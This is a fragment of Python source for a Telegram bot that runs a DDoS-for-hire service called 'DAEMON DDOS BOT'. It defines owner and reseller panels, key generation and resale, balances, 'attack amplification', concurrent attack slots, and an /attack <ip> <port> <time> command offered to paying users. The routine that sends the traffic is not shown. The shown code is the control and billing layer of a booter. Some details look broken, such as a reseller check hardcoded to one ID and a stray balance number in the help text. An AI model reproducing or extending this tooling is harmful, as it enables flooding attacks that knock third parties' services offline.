        safe_send_message(message.chat.id, f"💪 Current Attack Amplification: {current}x\n\nUsage: /concurrent <number>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 1 or new_value > 20:
            safe_send_message(message.chat.id, "❌ Value must be between 1-20!", reply_to=message)
            return
        set_attack_amplification(new_value)
        safe_send_message(message.chat.id, f"✅ Attack Amplification set to: {new_value}x", reply_to=message)
    except:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /block_ip <ip_prefix>\nExample: /block_ip 192.168.", reply_to=message)
        return
    
    if add_blocked_ip(command_parts[1]):
        safe_send_message(message.chat.id, f"✅ IP blocked: {command_parts[1]}*", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ IP already blocked!", reply_to=message)

@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblock_ip <ip_prefix>", reply_to=message)
        return
    
    if remove_blocked_ip(command_parts[1]):
        safe_send_message(message.chat.id, f"✅ IP unblocked: {command_parts[1]}*", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ IP not found in blocked list!", reply_to=message)

@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    blocked = get_blocked_ips()
    if not blocked:
        safe_send_message(message.chat.id, "📋 No IPs are blocked!", reply_to=message)
        return
    
    response = "🚫 BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. `{ip}`*\n"
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /maintenance <message>", reply_to=message)
        return
    
    set_maintenance_mode(True, command_parts[1])
    safe_send_message(message.chat.id, f"🔧 Maintenance Mode ON!\n\nMessage: {command_parts[1]}\n\nUse /ok to turn off", reply_to=message)

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    set_maintenance_mode(False)
    safe_send_message(message.chat.id, "✅ Maintenance Mode OFF!\n\nBot is now normal.", reply_to=message)

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    
    total_users = len(get_users())
    busy_slots, free_slots, total_slots = get_slot_status()
    
    response = f"""
📊 **SERVER STATISTICS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 **BOT INFO:**
• Uptime: {hours:02d}:{minutes:02d}:{seconds:02d}
• Memory: {memory_mb:.1f} MB
• CPU: {cpu_percent:.1f}%

⚔️ **ATTACK STATUS:**
• Active Attacks: {busy_slots}/{total_slots}
• Free Slots: {free_slots}
• Max Slots: {total_slots}
• Attack Amplification: {get_attack_amplification()}x

⚙️ **SETTINGS:**
• Max Attack Time: {get_max_attack_time()}s
• Individual Cooldown: {get_user_cooldown()}s

📈 **BOT DATA:**
• Total Users: {total_users}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    busy_slots, free_slots, total_slots = get_slot_status()
    
    help_text = f'''
👑 **OWNER PANEL**

**⚙️ CURRENT SETTINGS:**
• Max Attack Time: {get_max_attack_time()}s
• Min Attack Time: {MIN_ATTACK_TIME}s
• Individual Cooldown: {get_user_cooldown()}s
• Attack Amplification: {get_attack_amplification()}x
• Max Concurrent Slots: {total_slots}
• Available Slots: {free_slots}/{total_slots}

🔑 **KEY MANAGEMENT:**
• /gen <time> <count> - Generate keys
• /redeem <key> - Redeem key

👥 **USER MANAGEMENT:**
• /add_reseller <id> - Add reseller
• /remove_reseller <id> - Remove reseller
• /saldo_add <id> <amt> - Add balance
• /remove_user <id> - Remove user data

⚡ **ATTACK SETTINGS:**
• /attack <ip> <port> <time> - Attack (min {MIN_ATTACK_TIME}s)
• /status - Attack status
• /max_attack <sec> - Set max attack time
• /cooldown <sec> - Set individual cooldown
• /concurrent <num> - Set attack amplification
• /max_concurrent <num> - Set max simultaneous users
• /block_ip <prefix> - Block IP
• /unblock_ip <prefix> - Unblock IP
• /blocked_ips - View blocked IPs

🔧 **MAINTENANCE:**
• /maintenance <msg> - Maintenance ON
• /ok - Maintenance OFF

📊 **MONITORING:**
• /live - Server stats
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        help_text = '''
👑 **Welcome Owner!**

Use `/owner` to access the full owner panel.

🔐 **Regular User Commands:**
• /id - View your ID
• /ping - Check bot status
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack (min 60s)
'''
    elif is_reseller(5082501196):
        help_text = '''
💼 **RESELLER PANEL**

🆔 **ID:**
• /id - View your ID
• /ping - Check bot status

💰 **BALANCE:**
• /mysaldo - Check your balance. 6000000
• /prices - View key prices

🔑 **KEY GENERATION:**
• /gen <duration> <count> - Generate keys
  Durations: 12h, 1d, 3d, 7d, 30d, 60d

⚡ **ATTACK:**
• /redeem <key> - Redeem a key
• /attack <ip> <port> <time> - Attack (min 60s)
• /status - Attack status
• /mykey - Key details
'''
    else:
        help_text = '''
🔐 **COMMANDS:**
• /id - View your ID
• /ping - Check bot status
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack (min 60s)

DDOS BOT OWNER - @DAEMON_OWNER
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
    if is_owner(user_id):
        response = f'''👑 Welcome DAEMON Owner, {user_name}!

Use /owner to access the full owner panel.
Use /help to see basic commands.'''
    elif is_reseller(user_id):
        response = f'''💼 Welcome Reseller, {user_name}!

Use /help to see your commands.'''
    else:
        response = f'''👋 Welcome, {user_name}!

🔐 **Commands:**
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack (min 60s)

DDOS BOT OWNER - @DAEMON_OWNER
'''
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ BOT START ============
print("=" * 60)
print("🔥 DAEMON DDOS BOT STARTING...")
print("=" * 60)
print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
print(f"🎯 API: Kimstress (Min {MIN_ATTACK_TIME}s)")
print(f"⚙️ Max Concurrent Slots: {get_max_slots()}")
print(f"💪 Attack Amplification: {get_attack_amplification()}x")
print(f"⏳ Individual Cooldown: {get_user_cooldown()}s")
print("=" * 60)

import http.server
import socketserver

def run_web_server():
    PORT = int(os.environ.get("PORT", 10000))
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        httpd.serve_forever()

import threading
threading.Thread(target=run_web_server, daemon=True).start()

# Now add your bot's start command below
bot.infinity_polling()

